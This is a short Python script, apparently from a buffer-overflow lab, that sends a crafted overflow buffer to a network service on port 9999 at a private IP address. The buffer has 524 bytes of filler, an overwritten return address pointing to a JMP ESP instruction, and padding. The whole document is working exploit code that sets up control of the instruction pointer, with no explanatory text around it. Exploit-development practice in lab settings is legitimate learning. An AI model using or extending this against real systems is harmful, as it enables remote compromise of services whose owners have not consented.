#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
junk = "D" * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.0.116",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
